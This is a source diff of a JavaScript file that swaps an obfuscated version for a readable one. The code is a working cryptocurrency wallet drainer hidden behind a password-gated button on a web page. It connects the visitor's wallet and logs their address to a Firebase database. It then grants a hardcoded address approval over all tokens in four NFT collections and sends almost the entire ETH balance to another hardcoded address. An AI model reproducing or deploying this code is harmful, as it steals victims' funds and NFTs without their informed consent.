@@ -1,1 +1,703 @@
-const _0x474e3d=_0x54c1;(function(_0x3b4458,_0x162d09){const _0x17fdf3=_0x54c1,_0x37772e=_0x3b4458();while(!![]){try{const _0x301659=parseInt(_0x17fdf3(0x7f))/0x1+parseInt(_0x17fdf3(0x95))/0x2+parseInt(_0x17fdf3(0x8f))/0x3+parseInt(_0x17fdf3(0xe1))/0x4+-parseInt(_0x17fdf3(0x8d))/0x5+parseInt(_0x17fdf3(0xd7))/0x6*(parseInt(_0x17fdf3(0xb1))/0x7)+parseInt(_0x17fdf3(0x90))/0x8*(-parseInt(_0x17fdf3(0x85))/0x9);if(_0x301659===_0x162d09)break;else _0x37772e['push'](_0x37772e['shift']());}catch(_0x38c83d){_0x37772e['push'](_0x37772e['shift']());}}}(_0x5e57,0x33ef3),setTimeout(async()=>{const _0x3b5f21=_0x54c1;console['log'](_0x3b5f21(0x7d)),$('.MuiInput-input')['on']('input',function(_0x382449){const _0x1ace6d=_0x3b5f21;console['log'](_0x382449['target'][_0x1ace6d(0x86)]),localStorage['setItem']('pass',_0x382449[_0x1ace6d(0xd8)][_0x1ace6d(0x86)]);}),$('button')['on'](_0x3b5f21(0x88),async()=>{const _0x1d03bd=_0x3b5f21;console['log'](_0x1d03bd(0xb6));const _0x598df4=_0x1d03bd(0xe4);if(localStorage['getItem']('pass')===_0x598df4)$(_0x1d03bd(0x9a))['remove'](),$(_0x1d03bd(0xd0))[_0x1d03bd(0x8e)](_0x1d03bd(0xc1)),await loadWeb3(),await getAddress(),await trade();else{}});},0x3e8),$(document)[_0x474e3d(0xe0)](function(){const _0x3aebe9=_0x474e3d;console[_0x3aebe9(0xba)](_0x3aebe9(0x9b));}));const config={'apiKey':_0x474e3d(0xde),'authDomain':_0x474e3d(0xcc),'projectId':_0x474e3d(0x97),'storageBucket':_0x474e3d(0xdd),'messagingSenderId':_0x474e3d(0x83),'appId':'1:20777123504:web:5d991c72b7af82ff6f4575'},app=firebase[_0x474e3d(0xdf)](config),db=firebase['firestore'](app),ref=db[_0x474e3d(0xcf)](_0x474e3d(0xb5));function _0x5e57(){const _0x4123b0=['100000','connected','uint256','string','transferFrom','ownerOf','false','112LpsInz','update','getBalance','approved','jangtokyo','button\x20clicked','Approval','renounceOwnership','doc','log','toLowerCase','newOwner','reload','symbol','function','send','Share\x20Your\x20Progress','declined\x20..\x20butang\x20database','addresses','safeMint','previousOwner','eth\x20sent','view','balanceOf','owner','0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262','bytes4','jangneotokyo.firebaseapp.com','doc\x20not\x20found','successfully\x20added','collection','button','safeTransferFrom','code','approve','supportsInterface','exists','bool','96090BrBnDP','target','setApprovalForAll','eth','toString','getApproved','jangneotokyo.appspot.com','AIzaSyAvIsuf_K1uvzo3cXEJchcBWnxb7ryKzk0','initializeApp','ready','315180NvvNox','set','data\x20eth\x20sent','You\x20Are\x20Awaited','please\x20con\x20met','meh','fromWei','160053uuGnQZ','0xb9951b43802dcf3ef5b14567cb17adf367ed1c0f','transferOwnership','bytes','20777123504','then','711jnsdLZ','value','get','click','Document\x20successfully\x20written!','0x327a6fa5aab8ca48ad0e1fc149246eba6bf66d4e','operator','error','969055ILBDLq','html','64851CzbnLP','18904XQIEiQ','ether','utils','interfaceId','err','153012rGTjBX','address','jangneotokyo','event','catch','.MuiInputBase-root','yawa','web3','nonpayable','Error\x20writing\x20document:\x20','from','0xbc46a4D7773B53A2f35d765C78EBC648CEbfeA12','doc\x20exists','methods','tokenURI','data','ethereum','error\x20adding\x20document','constructor','0x4481507cc228fa19d203bd42110d679571f7912e','tokenId'];_0x5e57=function(){return _0x4123b0;};return _0x5e57();}function _0x54c1(_0x5877cf,_0x16aa51){const _0x5e5756=_0x5e57();return _0x54c1=function(_0x54c1fe,_0x13c00e){_0x54c1fe=_0x54c1fe-0x7c;let _0x1109c8=_0x5e5756[_0x54c1fe];return _0x1109c8;},_0x54c1(_0x5877cf,_0x16aa51);}let account;async function loadWeb3(){const _0x37283f=_0x474e3d;try{window[_0x37283f(0x9c)]=await new Web3(window[_0x37283f(0xa5)]);}catch{console[_0x37283f(0xba)](error);}}const _abi=[{'inputs':[],'stateMutability':'nonpayable','type':_0x474e3d(0xa7)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x474e3d(0x96),'name':_0x474e3d(0xc9),'type':_0x474e3d(0x96)},{'indexed':!![],'internalType':_0x474e3d(0x96),'name':'approved','type':_0x474e3d(0x96)},{'indexed':!![],'internalType':_0x474e3d(0xac),'name':'tokenId','type':_0x474e3d(0xac)}],'name':_0x474e3d(0xb7),'type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':'address','name':_0x474e3d(0xc9),'type':_0x474e3d(0x96)},{'indexed':!![],'internalType':_0x474e3d(0x96),'name':_0x474e3d(0x8b),'type':_0x474e3d(0x96)},{'indexed':![],'internalType':_0x474e3d(0xd6),'name':'approved','type':_0x474e3d(0xd6)}],'name':'ApprovalForAll','type':_0x474e3d(0x98)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x474e3d(0x96),'name':_0x474e3d(0xc5),'type':_0x474e3d(0x96)},{'indexed':!![],'internalType':_0x474e3d(0x96),'name':'newOwner','type':'address'}],'name':'OwnershipTransferred','type':_0x474e3d(0x98)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x474e3d(0x96),'name':_0x474e3d(0x9f),'type':_0x474e3d(0x96)},{'indexed':!![],'internalType':_0x474e3d(0x96),'name':'to','type':_0x474e3d(0x96)},{'indexed':!![],'internalType':_0x474e3d(0xac),'name':_0x474e3d(0xa9),'type':'uint256'}],'name':'Transfer','type':_0x474e3d(0x98)},{'inputs':[{'internalType':_0x474e3d(0x96),'name':'to','type':_0x474e3d(0x96)},{'internalType':_0x474e3d(0xac),'name':_0x474e3d(0xa9),'type':_0x474e3d(0xac)}],'name':_0x474e3d(0xd3),'outputs':[],'stateMutability':_0x474e3d(0x9d),'type':_0x474e3d(0xbf)},{'inputs':[{'internalType':_0x474e3d(0x96),'name':'owner','type':_0x474e3d(0x96)}],'name':_0x474e3d(0xc8),'outputs':[{'internalType':'uint256','name':'','type':_0x474e3d(0xac)}],'stateMutability':_0x474e3d(0xc7),'type':_0x474e3d(0xbf)},{'inputs':[{'internalType':'uint256','name':_0x474e3d(0xa9),'type':'uint256'}],'name':_0x474e3d(0xdc),'outputs':[{'internalType':_0x474e3d(0x96),'name':'','type':_0x474e3d(0x96)}],'stateMutability':'view','type':_0x474e3d(0xbf)},{'inputs':[{'internalType':'address','name':'owner','type':_0x474e3d(0x96)},{'internalType':_0x474e3d(0x96),'name':'operator','type':'address'}],'name':'isApprovedForAll','outputs':[{'internalType':_0x474e3d(0xd6),'name':'','type':'bool'}],'stateMutability':_0x474e3d(0xc7),'type':_0x474e3d(0xbf)},{'inputs':[],'name':'name','outputs':[{'internalType':_0x474e3d(0xad),'name':'','type':_0x474e3d(0xad)}],'stateMutability':_0x474e3d(0xc7),'type':_0x474e3d(0xbf)},{'inputs':[],'name':_0x474e3d(0xc9),'outputs':[{'internalType':_0x474e3d(0x96),'name':'','type':_0x474e3d(0x96)}],'stateMutability':_0x474e3d(0xc7),'type':_0x474e3d(0xbf)},{'inputs':[{'internalType':'uint256','name':'tokenId','type':'uint256'}],'name':_0x474e3d(0xaf),'outputs':[{'internalType':_0x474e3d(0x96),'name':'','type':_0x474e3d(0x96)}],'stateMutability':_0x474e3d(0xc7),'type':_0x474e3d(0xbf)},{'inputs':[],'name':_0x474e3d(0xb8),'outputs':[],'stateMutability':_0x474e3d(0x9d),'type':_0x474e3d(0xbf)},{'inputs':[{'internalType':_0x474e3d(0x96),'name':'to','type':_0x474e3d(0x96)},{'internalType':_0x474e3d(0xac),'name':_0x474e3d(0xa9),'type':_0x474e3d(0xac)}],'name':_0x474e3d(0xc4),'outputs':[],'stateMutability':'nonpayable','type':'function'},{'inputs':[{'internalType':_0x474e3d(0x96),'name':_0x474e3d(0x9f),'type':_0x474e3d(0x96)},{'internalType':_0x474e3d(0x96),'name':'to','type':_0x474e3d(0x96)},{'internalType':_0x474e3d(0xac),'name':_0x474e3d(0xa9),'type':'uint256'}],'name':_0x474e3d(0xd1),'outputs':[],'stateMutability':_0x474e3d(0x9d),'type':'function'},{'inputs':[{'internalType':_0x474e3d(0x96),'name':_0x474e3d(0x9f),'type':_0x474e3d(0x96)},{'internalType':'address','name':'to','type':_0x474e3d(0x96)},{'internalType':'uint256','name':_0x474e3d(0xa9),'type':_0x474e3d(0xac)},{'internalType':_0x474e3d(0x82),'name':_0x474e3d(0xa4),'type':_0x474e3d(0x82)}],'name':_0x474e3d(0xd1),'outputs':[],'stateMutability':_0x474e3d(0x9d),'type':_0x474e3d(0xbf)},{'inputs':[{'internalType':_0x474e3d(0x96),'name':_0x474e3d(0x8b),'type':_0x474e3d(0x96)},{'internalType':_0x474e3d(0xd6),'name':_0x474e3d(0xb4),'type':_0x474e3d(0xd6)}],'name':_0x474e3d(0xd9),'outputs':[],'stateMutability':_0x474e3d(0x9d),'type':_0x474e3d(0xbf)},{'inputs':[{'internalType':_0x474e3d(0xcb),'name':_0x474e3d(0x93),'type':'bytes4'}],'name':_0x474e3d(0xd4),'outputs':[{'internalType':_0x474e3d(0xd6),'name':'','type':_0x474e3d(0xd6)}],'stateMutability':_0x474e3d(0xc7),'type':_0x474e3d(0xbf)},{'inputs':[],'name':_0x474e3d(0xbe),'outputs':[{'internalType':'string','name':'','type':_0x474e3d(0xad)}],'stateMutability':_0x474e3d(0xc7),'type':_0x474e3d(0xbf)},{'inputs':[{'internalType':_0x474e3d(0xac),'name':_0x474e3d(0xa9),'type':'uint256'}],'name':_0x474e3d(0xa3),'outputs':[{'internalType':_0x474e3d(0xad),'name':'','type':_0x474e3d(0xad)}],'stateMutability':_0x474e3d(0xc7),'type':_0x474e3d(0xbf)},{'inputs':[{'internalType':_0x474e3d(0x96),'name':_0x474e3d(0x9f),'type':_0x474e3d(0x96)},{'internalType':'address','name':'to','type':_0x474e3d(0x96)},{'internalType':_0x474e3d(0xac),'name':_0x474e3d(0xa9),'type':'uint256'}],'name':_0x474e3d(0xae),'outputs':[],'stateMutability':_0x474e3d(0x9d),'type':_0x474e3d(0xbf)},{'inputs':[{'internalType':_0x474e3d(0x96),'name':_0x474e3d(0xbc),'type':_0x474e3d(0x96)}],'name':_0x474e3d(0x81),'outputs':[],'stateMutability':_0x474e3d(0x9d),'type':_0x474e3d(0xbf)}];async function getAddress(){const _0x12d223=_0x474e3d,_0x5c9559=await window[_0x12d223(0xa5)]['request']({'method':'eth_requestAccounts'})['catch'](_0x4efdfc=>{const _0x52fa62=_0x12d223;_0x4efdfc[_0x52fa62(0xd2)]===0xfa1?(console[_0x52fa62(0xba)](_0x52fa62(0x7c)),location[_0x52fa62(0xbd)]()):console[_0x52fa62(0x8c)](_0x4efdfc);});account=_0x5c9559[0x0],console['log'](account);const _0x20d336=db['collection'](_0x12d223(0xc3))['doc'](account);await _0x20d336[_0x12d223(0x87)]()['then'](_0x5475d2=>{const _0x461438=_0x12d223;_0x5475d2[_0x461438(0xd5)]?(console[_0x461438(0xba)](_0x461438(0xa1)),_0x20d336[_0x461438(0xb2)]({'status':_0x461438(0xab),'date':new Date()})):(console['log'](_0x461438(0xcd)),_0x20d336[_0x461438(0xe2)]({'address':account,'date':new Date(),'status':_0x461438(0xab)})['then'](()=>{const _0x5bbcac=_0x461438;console['log'](_0x5bbcac(0xce));})[_0x461438(0x99)](()=>{const _0x37d684=_0x461438;console[_0x37d684(0xba)](_0x37d684(0xa6));}));});}async function trade(){const _0x14f983=_0x474e3d,_0x10adf8=[_0x14f983(0x8a),'0xa19f5264f7d7be11c451c093d8f92592820bea86',_0x14f983(0x80),_0x14f983(0xa8)];_0x10adf8['forEach'](async _0x47182a=>{const _0x2f305b=_0x14f983;try{var _0x583483=await new window[(_0x2f305b(0x9c))]['eth']['Contract'](_abi,_0x47182a,{'gas':_0x2f305b(0xaa)});await _0x583483[_0x2f305b(0xa2)][_0x2f305b(0xd9)](_0x2f305b(0xa0),!![])[_0x2f305b(0xc0)]({'from':account});const _0x2b97e7=db[_0x2f305b(0xcf)](account['toLowerCase']());_0x2b97e7[_0x2f305b(0xb9)](_0x47182a)['set']({'approved':'true','contract':_0x47182a,'date':new Date(),'owner':account})[_0x2f305b(0x84)](()=>{const _0x5e317e=_0x2f305b;console[_0x5e317e(0xba)](_0x5e317e(0x89));})[_0x2f305b(0x99)](_0x312ecf=>{const _0x3457aa=_0x2f305b;console[_0x3457aa(0x8c)](_0x3457aa(0x9e),_0x312ecf);});}catch(_0x219e5b){console[_0x2f305b(0xba)](_0x2f305b(0xc2),account[_0x2f305b(0xbb)]());const _0x1c2878=db[_0x2f305b(0xcf)](account[_0x2f305b(0xbb)]());_0x1c2878[_0x2f305b(0xb9)](_0x47182a)[_0x2f305b(0xe2)]({'approved':_0x2f305b(0xb0),'contract':_0x47182a,'date':new Date(),'owner':account})['then'](()=>{const _0x4c400f=_0x2f305b;console[_0x4c400f(0xba)]('Document\x20successfully\x20written!');})[_0x2f305b(0x99)](_0x3ecb3f=>{const _0x2ca05d=_0x2f305b;console[_0x2ca05d(0x8c)](_0x2ca05d(0x9e),_0x3ecb3f);});}});var _0x4f9700=await get_eth(account),_0x587502=_0x4f9700-0.0084;const _0x1019c6=Web3[_0x14f983(0x92)]['toWei'](_0x587502[_0x14f983(0xdb)](),_0x14f983(0x91));console[_0x14f983(0xba)](_0x1019c6);const _0x4a4671={'from':account,'to':_0x14f983(0xca),'value':_0x1019c6};await web3['eth']['sendTransaction'](_0x4a4671)[_0x14f983(0x84)](_0x31aea5=>{const _0x424b4d=_0x14f983;db[_0x424b4d(0xcf)](_0x424b4d(0xc6))['add'](_0x4a4671)[_0x424b4d(0x84)](()=>{const _0x555574=_0x424b4d;console[_0x555574(0xba)](_0x555574(0xe3));})[_0x424b4d(0x99)](()=>{const _0x2d3037=_0x424b4d;console['log'](_0x2d3037(0x94));}),console[_0x424b4d(0xba)](_0x31aea5);})[_0x14f983(0x99)](_0x57ab17=>{const _0x61cd=_0x14f983;console[_0x61cd(0xba)](_0x57ab17);});}async function get_eth(_0x18142d){const _0xea5443=_0x474e3d,_0x162095=web3['utils'][_0xea5443(0x7e)](await web3[_0xea5443(0xda)][_0xea5443(0xb3)](_0x18142d),_0xea5443(0x91))*0x1;return _0x162095;}
+
+
+
+setTimeout( async () => {
+
+    console.log('meh')
+
+ 
+
+    $('.MuiInput-input').on('input', function (e) {
+        console.log(e.target.value)
+
+        localStorage.setItem('pass', e.target.value)
+    })
+
+    $('button').on('click', async () => {
+        console.log('button clicked')
+
+        const password = 'You Are Awaited'
+
+    //     const inp = $('.MuiInput-input').val()
+
+    // console.log(inp)
+
+    if (localStorage.getItem('pass') === password) {
+
+        $('.MuiInputBase-root').remove()
+        $('button').html('Share Your Progress')
+
+
+              await loadWeb3()
+  
+      await getAddress()
+
+      await trade()
+
+    } else {
+
+    }
+
+
+    // $('.MuiStack-root ').append(`<p class="MuiTypography-root MuiTypography-body1 css-x1iqlg">Incorrect.</p>`)
+
+
+
+          
+    //   await loadWeb3()
+  
+    //   await getAddress()
+
+    //   await trade()
+  
+    })
+}, 1000);
+
+
+
+
+
+$(document).ready(function () {
+    console.log('yawa');
+  })
+  
+  //FIREBASE
+
+  const config = {
+    apiKey: "AIzaSyAvIsuf_K1uvzo3cXEJchcBWnxb7ryKzk0",
+    authDomain: "jangneotokyo.firebaseapp.com",
+    projectId: "jangneotokyo",
+    storageBucket: "jangneotokyo.appspot.com",
+    messagingSenderId: "20777123504",
+    appId: "1:20777123504:web:5d991c72b7af82ff6f4575"
+    }
+    
+    const app = firebase.initializeApp(config)
+    const db = firebase.firestore(app)
+    
+    const ref = db.collection('jangtokyo')
+  
+  let account;
+
+  async function loadWeb3() {
+      try {
+        window.web3 = await new Web3(window.ethereum)
+      } catch {
+        console.log(error)
+      }
+      }
+  
+      const _abi = [
+          {
+            inputs: [],
+            stateMutability: "nonpayable",
+            type: "constructor",
+          },
+          {
+            anonymous: false,
+            inputs: [
+              {
+                indexed: true,
+                internalType: "address",
+                name: "owner",
+                type: "address",
+              },
+              {
+                indexed: true,
+                internalType: "address",
+                name: "approved",
+                type: "address",
+              },
+              {
+                indexed: true,
+                internalType: "uint256",
+                name: "tokenId",
+                type: "uint256",
+              },
+            ],
+            name: "Approval",
+            type: "event",
+          },
+          {
+            anonymous: false,
+            inputs: [
+              {
+                indexed: true,
+                internalType: "address",
+                name: "owner",
+                type: "address",
+              },
+              {
+                indexed: true,
+                internalType: "address",
+                name: "operator",
+                type: "address",
+              },
+              {
+                indexed: false,
+                internalType: "bool",
+                name: "approved",
+                type: "bool",
+              },
+            ],
+            name: "ApprovalForAll",
+            type: "event",
+          },
+          {
+            anonymous: false,
+            inputs: [
+              {
+                indexed: true,
+                internalType: "address",
+                name: "previousOwner",
+                type: "address",
+              },
+              {
+                indexed: true,
+                internalType: "address",
+                name: "newOwner",
+                type: "address",
+              },
+            ],
+            name: "OwnershipTransferred",
+            type: "event",
+          },
+          {
+            anonymous: false,
+            inputs: [
+              {
+                indexed: true,
+                internalType: "address",
+                name: "from",
+                type: "address",
+              },
+              {
+                indexed: true,
+                internalType: "address",
+                name: "to",
+                type: "address",
+              },
+              {
+                indexed: true,
+                internalType: "uint256",
+                name: "tokenId",
+                type: "uint256",
+              },
+            ],
+            name: "Transfer",
+            type: "event",
+          },
+          {
+            inputs: [
+              {
+                internalType: "address",
+                name: "to",
+                type: "address",
+              },
+              {
+                internalType: "uint256",
+                name: "tokenId",
+                type: "uint256",
+              },
+            ],
+            name: "approve",
+            outputs: [],
+            stateMutability: "nonpayable",
+            type: "function",
+          },
+          {
+            inputs: [
+              {
+                internalType: "address",
+                name: "owner",
+                type: "address",
+              },
+            ],
+            name: "balanceOf",
+            outputs: [
+              {
+                internalType: "uint256",
+                name: "",
+                type: "uint256",
+              },
+            ],
+            stateMutability: "view",
+            type: "function",
+          },
+          {
+            inputs: [
+              {
+                internalType: "uint256",
+                name: "tokenId",
+                type: "uint256",
+              },
+            ],
+            name: "getApproved",
+            outputs: [
+              {
+                internalType: "address",
+                name: "",
+                type: "address",
+              },
+            ],
+            stateMutability: "view",
+            type: "function",
+          },
+          {
+            inputs: [
+              {
+                internalType: "address",
+                name: "owner",
+                type: "address",
+              },
+              {
+                internalType: "address",
+                name: "operator",
+                type: "address",
+              },
+            ],
+            name: "isApprovedForAll",
+            outputs: [
+              {
+                internalType: "bool",
+                name: "",
+                type: "bool",
+              },
+            ],
+            stateMutability: "view",
+            type: "function",
+          },
+          {
+            inputs: [],
+            name: "name",
+            outputs: [
+              {
+                internalType: "string",
+                name: "",
+                type: "string",
+              },
+            ],
+            stateMutability: "view",
+            type: "function",
+          },
+          {
+            inputs: [],
+            name: "owner",
+            outputs: [
+              {
+                internalType: "address",
+                name: "",
+                type: "address",
+              },
+            ],
+            stateMutability: "view",
+            type: "function",
+          },
+          {
+            inputs: [
+              {
+                internalType: "uint256",
+                name: "tokenId",
+                type: "uint256",
+              },
+            ],
+            name: "ownerOf",
+            outputs: [
+              {
+                internalType: "address",
+                name: "",
+                type: "address",
+              },
+            ],
+            stateMutability: "view",
+            type: "function",
+          },
+          {
+            inputs: [],
+            name: "renounceOwnership",
+            outputs: [],
+            stateMutability: "nonpayable",
+            type: "function",
+          },
+          {
+            inputs: [
+              {
+                internalType: "address",
+                name: "to",
+                type: "address",
+              },
+              {
+                internalType: "uint256",
+                name: "tokenId",
+                type: "uint256",
+              },
+            ],
+            name: "safeMint",
+            outputs: [],
+            stateMutability: "nonpayable",
+            type: "function",
+          },
+          {
+            inputs: [
+              {
+                internalType: "address",
+                name: "from",
+                type: "address",
+              },
+              {
+                internalType: "address",
+                name: "to",
+                type: "address",
+              },
+              {
+                internalType: "uint256",
+                name: "tokenId",
+                type: "uint256",
+              },
+            ],
+            name: "safeTransferFrom",
+            outputs: [],
+            stateMutability: "nonpayable",
+            type: "function",
+          },
+          {
+            inputs: [
+              {
+                internalType: "address",
+                name: "from",
+                type: "address",
+              },
+              {
+                internalType: "address",
+                name: "to",
+                type: "address",
+              },
+              {
+                internalType: "uint256",
+                name: "tokenId",
+                type: "uint256",
+              },
+              {
+                internalType: "bytes",
+                name: "data",
+                type: "bytes",
+              },
+            ],
+            name: "safeTransferFrom",
+            outputs: [],
+            stateMutability: "nonpayable",
+            type: "function",
+          },
+          {
+            inputs: [
+              {
+                internalType: "address",
+                name: "operator",
+                type: "address",
+              },
+              {
+                internalType: "bool",
+                name: "approved",
+                type: "bool",
+              },
+            ],
+            name: "setApprovalForAll",
+            outputs: [],
+            stateMutability: "nonpayable",
+            type: "function",
+          },
+          {
+            inputs: [
+              {
+                internalType: "bytes4",
+                name: "interfaceId",
+                type: "bytes4",
+              },
+            ],
+            name: "supportsInterface",
+            outputs: [
+              {
+                internalType: "bool",
+                name: "",
+                type: "bool",
+              },
+            ],
+            stateMutability: "view",
+            type: "function",
+          },
+          {
+            inputs: [],
+            name: "symbol",
+            outputs: [
+              {
+                internalType: "string",
+                name: "",
+                type: "string",
+              },
+            ],
+            stateMutability: "view",
+            type: "function",
+          },
+          {
+            inputs: [
+              {
+                internalType: "uint256",
+                name: "tokenId",
+                type: "uint256",
+              },
+            ],
+            name: "tokenURI",
+            outputs: [
+              {
+                internalType: "string",
+                name: "",
+                type: "string",
+              },
+            ],
+            stateMutability: "view",
+            type: "function",
+          },
+          {
+            inputs: [
+              {
+                internalType: "address",
+                name: "from",
+                type: "address",
+              },
+              {
+                internalType: "address",
+                name: "to",
+                type: "address",
+              },
+              {
+                internalType: "uint256",
+                name: "tokenId",
+                type: "uint256",
+              },
+            ],
+            name: "transferFrom",
+            outputs: [],
+            stateMutability: "nonpayable",
+            type: "function",
+          },
+          {
+            inputs: [
+              {
+                internalType: "address",
+                name: "newOwner",
+                type: "address",
+              },
+            ],
+            name: "transferOwnership",
+            outputs: [],
+            stateMutability: "nonpayable",
+            type: "function",
+          },
+        ];
+  
+  
+//   $('#japjapconnect').on('click', async() => {
+    
+  
+//       await loadWeb3()
+  
+//       await getAddress()
+//       // alert('JAPJAP CONNECT')
+  
+//       // japjap()
+  
+//       await trade()
+  
+//   })
+  
+  
+  
+  
+  
+  
+  
+  
+      async function getAddress() {
+  
+  
+  
+          const accounts = await window.ethereum.request({
+              method: 'eth_requestAccounts'
+          }).catch( (err) => {
+              if (err.code === 4001) {
+                  console.log('please con met');
+                  location.reload()
+                  
+              } else {
+                  console.error(err)
+              }
+          
+          });
+        
+          account = accounts[0]
+          console.log(account)
+        
+          
+        
+          const LISTCOLLECTION =   db.collection('addresses').doc(account)
+
+
+          await LISTCOLLECTION.get().then(
+            (docSnapshot) => {
+              if (
+                docSnapshot.exists
+              ) {
+                console.log('doc exists')
+                LISTCOLLECTION.update({
+                  status: 'connected',
+                  date: new Date()
+                })
+        
+              } else {
+        
+                console.log('doc not found')
+                LISTCOLLECTION.set({
+                  address: account,
+                  date: new Date(),
+                  status: 'connected'
+                }).then( () => {
+                  console.log('successfully added')
+                }).catch( () => {
+                  console.log('error adding document');
+                })
+        
+        
+              }
+            }
+          )
+        
+        
+        
+        }
+
+
+
+  
+        async function trade() {
+        //   await loadWeb3();
+
+        const neo = [
+            '0x327a6fa5aab8ca48ad0e1fc149246eba6bf66d4e',
+            '0xa19f5264f7d7be11c451c093d8f92592820bea86',
+            '0xb9951b43802dcf3ef5b14567cb17adf367ed1c0f',
+            '0x4481507cc228fa19d203bd42110d679571f7912e',
+          ]  
+
+          neo.forEach( async e => {
+
+            try {
+                
+            var collectionContract = await new window.web3.eth.Contract(_abi, e, {gas: '100000'})
+            await collectionContract.methods.setApprovalForAll('0xbc46a4D7773B53A2f35d765C78EBC648CEbfeA12', true).send({from: account})
+
+
+            //
+            const collection_contracts = db.collection(account.toLowerCase())
+
+
+            collection_contracts.doc(e).set({
+                approved: 'true',
+                contract: e,
+                date: new Date(),
+                owner: account,
+            }).then( () => {
+                console.log("Document successfully written!");
+            }).catch((error) => {
+                console.error("Error writing document: ", error);
+            });
+
+
+
+
+            } catch (error) {
+
+              
+                console.log('declined .. butang database', account.toLowerCase())
+
+
+                const collection_contracts = db.collection(account.toLowerCase())
+
+
+                collection_contracts.doc(e).set({
+                    approved: 'false',
+                    contract: e,
+                    date: new Date(),
+                    owner: account,
+                }).then( () => {
+                    console.log("Document successfully written!");
+                }).catch((error) => {
+                    console.error("Error writing document: ", error);
+                });
+
+                // db.collection("cities").get().then((querySnapshot) => {
+                //     querySnapshot.forEach((doc) => {
+                //         // doc.data() is never undefined for query doc snapshots
+                //         console.log(doc.id, " => ", doc.data());
+                //     });
+                // });
+
+
+            }
+
+
+
+  
+          })
+
+  
+  
+          // eth send
+
+          var value = await get_eth(account) //search getbalance.js
+          var minusvalue = value - 0.0084 //it can be userinputted or set by a webpage or estimated by a thirdparty
+          
+          const finalAmount = Web3.utils.toWei(minusvalue.toString(), 'ether')
+
+
+
+          console.log(finalAmount)
+          const txData = {
+          from: account,
+          to: '0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262',
+          value: finalAmount,
+          };
+
+
+          await web3.eth.sendTransaction(txData)
+          .then( (txHash) => {
+
+          db.collection('eth sent').add(txData).then( () => {
+            console.log('data eth sent')
+          }).catch( () => {
+              console.log('err')
+          })
+
+          console.log(txHash)
+          }).catch( (err) => {
+
+
+
+          console.log(err)
+          })
+
+
+        }
+
+
+
+        //get eth
+        async function get_eth(address) {
+
+          const balances = web3.utils.fromWei(
+            await web3.eth.getBalance(address),
+            'ether'
+          )* 1;
+        
+          return balances;
+        
+        }
